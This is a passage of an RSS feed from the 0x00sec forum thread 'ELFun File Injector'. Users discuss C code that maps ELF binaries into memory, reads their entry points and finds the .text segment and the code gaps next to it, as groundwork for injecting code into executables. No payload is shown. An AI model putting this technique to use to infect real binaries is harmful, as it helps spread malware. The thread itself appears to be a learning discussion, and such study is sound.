<pre><code class="lang-auto">if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
</code></pre>
<p>be:</p>
<pre><code class="lang-auto">if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; ~(elf_seg-&gt;p_flags ^ 0x5)
</code></pre>
<p>Considering:<br>
<code>PF_X = 0x1 PF_W = 0x2 PF_R = 0x4</code><br>
&amp; 0x11, would only hold true for PF_X. Or is .text always the first executable segment it will find?</p>
<p>And I have a question about the following:</p>
<pre><code class="lang-auto">  for (i = 0; i &lt; n_seg; i++)
    {
      if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
	{
	  printf ("+ Found .text segment (#%d)\n", i);
	  text_seg = elf_seg;
	  text_end = elf_seg-&gt;p_offset + elf_seg-&gt;p_filesz;
	}
      else
	{
	  if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; 
	      (elf_seg-&gt;p_offset - text_end) &lt; gap) 
	    {
	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
		      i, (unsigned int)elf_seg-&gt;p_offset);
	      gap = elf_seg-&gt;p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr-&gt;e_phentsize);
    }
</code></pre>
<p>At the end of each iteration, the elf_seg pointer gets incremented.<br>
that means it points to the struct Elf64_Phdr, + some additional.<br>
This seems counterintuitive to me because if:</p>
<pre><code class="lang-auto">| member0 | ... | memberx | ... | member n | ... | member n+x | ...
   └─strct strct-&gt;a──┘               │                   │
 after m iterations: strct───────────┘ strct-&gt;a──────────┘
</code></pre>
<p>So if you’d increment the pointer, wouldn’t that cause it to no longer point to the first member of the struct. And wouldn’t that cause that adressing members goes wrong?</p>
<p>Nvm I’m being stupid, shouldve checked the manpage properly ^^<br>
<em><strong>e_phentsize</strong> This member holds the size in bytes of one entry in the file’s program header table; all entries are the same size.</em><br>
So it does indeed increment the pointer of the struct to such extends that it actually does point to a new struct (entry) in the file<br>
Awesome ^^</p>
<p>Another question (I just keep 'em coming):<br>
Why are we looking for the smallest gap, instead of the biggest?</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/13</link>
        <pubDate>Thu, 09 Jun 2016 15:58:49 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-13</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Why not use <code>#ifndef</code> stuff?</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/12</link>
        <pubDate>Thu, 09 Jun 2016 15:35:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-12</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>That’s one way, the thing is, I want to let the program check what architecture it is, by typecasting data as an array first and see what arr[4]'s value is (e_ident[EI_CLASS]). So that it would work on both 32 bit and 64 bit.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/11</link>
        <pubDate>Thu, 09 Jun 2016 15:30:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-11</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Then you need to use the 32bits structures… there are some differences between both… basically change 64 to 32 in all the data structures (e.g. <code>Elf64_Ehdr</code> -&gt; <code>Elf32_Ehdr</code>).</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/10</link>
        <pubDate>Thu, 09 Jun 2016 04:46:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-10</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>I’ll also work on 32bit support, might this be a cause for the issue?</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/9</link>
        <pubDate>Wed, 08 Jun 2016 22:35:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-9</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="unh0lys0da" data-post="7" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
 unh0lys0da:</div>
<blockquote>
<p>So does this work, because mmap begins from the start of the file, where the magic happens?Because that realization is just mindblowing.</p>
</blockquote>
</aside>
<p>Yes, you will get the same, if you open the file normally and just read the first bytes in a <code>Elf64_Ehdr</code> variable.</p>
<p>I’m looking forward to your findings. It looks to be related to <code>PIE</code> code… but it may just be something stupid…</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/8</link>
        <pubDate>Wed, 08 Jun 2016 21:37:36 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-8</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Ok so I figured out what every line of code does and I’m stunned.<br>
This is amazing man so many props.<br>
mmaping, typecasting as Elf header struct, I never thought something like that would be possible.<br>
Thanks for keeping the fun in my pursuit in gaining knowledge <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
<em>tbh I had a small crisis of faith in my pursuit lately</em><br>
Few questions though:</p>
<pre><code class="lang-auto">   if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror ("mmap:");
      exit (1);
    }
</code></pre>
<p>Here you mmap the file to *data.<br>
Which you then here:</p>
<pre><code class="lang-auto">  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr-&gt;e_entry;
  printf ("+ Target Entry point: %p\n", (void*) ep);
</code></pre>
<p>typecast as Elf64_Ehdr</p>
<p>So does this work, because mmap begins from the start of the file, where the magic happens?<br>
Because that realization is just mindblowing.</p>
<p>Alright I’m gonna let all of this sink in and try to find why it doesnt work sometimes.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/7</link>
        <pubDate>Wed, 08 Jun 2016 21:26:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-7</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
  </channel>
</rss>
